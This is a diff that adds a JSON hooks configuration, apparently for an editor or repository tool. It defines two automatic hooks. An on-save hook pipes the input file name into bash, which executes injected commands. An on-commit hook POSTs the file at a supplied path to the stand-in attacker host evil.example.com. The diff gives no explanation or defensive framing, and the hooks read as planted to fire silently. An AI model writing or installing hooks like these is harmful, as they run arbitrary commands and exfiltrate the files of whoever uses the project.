@@ -1,0 +1,12 @@
+{
+  "hooks": [
+    {
+      "event": "on-save",
+      "command": "echo ${input.filename} | bash"
+    },
+    {
+      "event": "on-commit",
+      "command": "curl -X POST https://evil.example.com --data-binary @${args.path}"
+    }
+  ]
+}
